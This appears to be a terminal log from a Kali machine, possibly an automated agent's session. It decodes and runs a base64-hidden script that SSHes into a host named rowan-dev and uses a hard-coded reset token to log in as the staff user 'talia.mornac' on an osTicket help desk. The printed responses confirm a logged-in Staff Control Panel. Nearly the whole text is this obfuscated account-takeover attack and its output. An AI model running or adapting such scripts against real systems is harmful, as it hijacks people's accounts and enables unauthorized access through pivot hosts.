@@ -1,0 +1,48 @@
+└─$ └─$ 
+
+┌──(cinder@kali)-[~]
+└─$ └─$ base64 -d > /tmp/r11.sh <<'B64EOF'
+> c2V0ICtlClM9InNzaCAtbyBCYXRjaE1vZGU9eWVzIC1vIFN0cmljdEhvc3RLZXlDaGVja2luZz1ubyByb3dhbi1kZXYiCiRTICdiYXNoIC1zJyA8PCdJTk5FUicKQ0E9L2hvbWUvcm93YW4vLmxvY2FsL3NoYXJlL2tlcGxlcm9wcy9jYS5jcnQKQj1odHRwczovL3N1cHBvcnQua2VwbGVyb3BzLnRlc3QKSj0vdG1wL2Nrci50eHQ7IHJtIC1mICRKClRPS0VOPWsxNy10YWxpYS1tb3JuYWMtcmV2aWV3LXRva2VuLTI4NDEKY3VybCAtc1MgLW0gMTAgLS1jYWNlcnQgJENBIC1jICRKIC1iICRKICIkQi9zY3AvcHdyZXNldC5waHA/dG9rZW49JFRPS0VOIiAtbyAvdG1wL3gxLmh0bWwKVD0kKGdyZXAgLW9FICduYW1lPSJfX0NTUkZUb2tlbl9fIiB2YWx1ZT0iW14iXSsiJyAvdG1wL3gxLmh0bWwgfCBzZWQgLUUgJ3MvLip2YWx1ZT0iKFteIl0rKSIuKi9cMS8nKQplY2hvICI9PT0gUE9TVCB0YWxpYS5tb3JuYWMsIGhlYWRlcnMgPT09IgpjdXJsIC1zUyAtbSAxMCAtLWNhY2VydCAkQ0EgLWIgJEogLWMgJEogLWkgLVggUE9TVCAiJEIvc2NwL3B3cmVzZXQucGhwIiBcCiAgLS1kYXRhLXVybGVuY29kZSAiX19DU1JGVG9rZW5fXz0kVCIgLS1kYXRhLXVybGVuY29kZSAiZG89bmV3cGFzc3dkIiAtLWRhdGEtdXJsZW5jb2RlICJ0b2tlbj0kVE9LRU4iIFwKICAtLWRhdGEtdXJsZW5jb2RlICJ1c2VyaWQ9dGFsaWEubW9ybmFjIiAtLWRhdGEtdXJsZW5jb2RlICJzdWJtaXQ9TG9naW4iIC1vIC90bXAvaGRyLnR4dApoZWFkIC0yNSAvdG1wL2hkci50eHQKTE9DPSQoZ3JlcCAtaSAnXmxvY2F0aW9uOicgL3RtcC9oZHIudHh0IHwgdHIgLWQgJ1xyJyB8IGF3ayAne3ByaW50ICQyfScpCmVjaG8gIkxPQz0kTE9DIgplY2hvICI9PT0gRk9MTE9XID09PSIKY3VybCAtc1MgLW0gMTAgLS1jYWNlcnQgJENBIC1iICRKIC1jICRKIC1pICIkQi9zY3AvJExPQyIgLW8gL3RtcC94My5odG1sIDI+L2Rldi9udWxsIHx8IGN1cmwgLXNTIC1tIDEwIC0tY2FjZXJ0ICRDQSAtYiAkSiAtYyAkSiAtaSAiJExPQyIgLW8gL3RtcC94My5odG1sCmhlYWQgLTE1IC90bXAveDMuaHRtbAplY2hvICItLS0gZm9ybXMgLS0tIjsgZ3JlcCAtb0UgJzxmb3JtW14+XSo+fDxpbnB1dFtePl0qPnw8aDM+W148XSonIC90bXAveDMuaHRtbAplY2hvICItLS0gdGV4dCAtLS0iCnB5dGhvbjMgLSA8PCdQWScKaW1wb3J0IHJlLGh0bWwKZD1vcGVuKCcvdG1wL3gzLmh0bWwnLGVycm9ycz0naWdub3JlJykucmVhZCgpCmQ9cmUuc3ViKHInPHNjcmlwdC4qPzwvc2NyaXB0PicsJycsZCxmbGFncz1yZS5TKTsgZD1yZS5zdWIocic8c3R5bGUuKj88L3N0eWxlPicsJycsZCxmbGFncz1yZS5TKQp0PXJlLnN1YihyJzxbXj5dKz4nLCcgJyxkKTsgdD1odG1sLnVuZXNjYXBlKHQpOyB0PXJlLnN1YihyJ1xzKycsJyAnLHQpCnByaW50KHRbOjIwMDBdKQpQWQpJTk5FUgo=
+> B64EOF
+
+┌──(cinder@kali)-[~]
+└─$ └─$ chmod +x /tmp/r11.sh; bash /tmp/r11.sh; echo DONEMARK_1795194848424$((6*7))
+=== POST talia.mornac, headers ===
+HTTP/1.1 302 Found
+Server: nginx
+Date: Fri, 20 Nov 2026 17:19:27 GMT
+Content-Type: text/html; charset=utf-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/8.4.27
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Location: index.php
+
+<html></html>LOC=index.php
+=== FOLLOW ===
+HTTP/1.1 200 OK
+Server: nginx
+Date: Fri, 20 Nov 2026 17:19:27 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/8.4.27
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Content-Security-Policy: frame-ancestors 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; object-src 'none'
+Vary: Accept-Encoding
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
+<html lang="en-US">
+--- forms ---
+<form action="profile.php" method="post" class="save" autocomplete="off">
+<input type="hidden" name="__CSRFToken__" value="431bfdb1c2cc5327937d2a120c14367a3343e351" />
+<input type="hidden" name="do" value="update">
+<input type="hidden" name="id" value="4">
+<h3>
+<input type="button" value="OK" class="close ok">
+--- text ---
+HTTP/1.1 200 OK Server: nginx Date: Fri, 20 Nov 2026 17:19:27 GMT Content-Type: text/html; charset=UTF-8 Transfer-Encoding: chunked Connection: keep-alive X-Powered-By: PHP/8.4.27 Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate Pragma: no-cache Content-Security-Policy: frame-ancestors 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; object-src 'none' Vary: Accept-Encoding osTicket :: Staff Control Panel Welcome, Talia . | Agent Panel | Profile | Log Out Dashboard Tasks Tasks Tickets Knowledgebase FAQs Dashboard Agent Directory My Profile Hi Talia - You must change your password to continue ! My Account Profile Account Preferences Signature Name: Email Address: Phone Number: Ext Mobile Number: Authentication Username: * Change Password Default 2FA: — Disable — Email Configure Options Status and Settings Vacation Mode Preferences Profile preferences and settings Maximum Page size: — System Default — show 5 records show 10 records show 15 records show 20 records show 25 records show 30 records show 35 records show 40 records show 45 records show 50 records per page. Auto Refresh Rate: Tickets page refresh rate in minutes. — Disabled — Every minute Every 2 minutes Every 3 minutes Every 4 minutes Every 5 minutes Every 6 minutes Every 7 minutes Every 8 minutes Every 9 minutes Every 10 minutes Every 12 minutes Every 14 minutes Every 16 minutes Every 18 minutes Every 20 minutes Every 22 minutes Every 24 minutes Every 26 minutes Every 28 minutes Every 30 minutes Default From Name: From name to use when replying to a thread Email Address Name Department Name (if public) My Name — System Default — Default Ticket Queue: — system default — Open Open / Open My Tickets / Assigned to Me Closed / Today Open / Answered My Tickets / Assigned to Teams Closed / Yesterday Open / Overdue My Tickets Closed / This Week Closed Closed / This Month Closed / This Quarter Closed / This Year Thread View Order: The order of thread entries Descendin
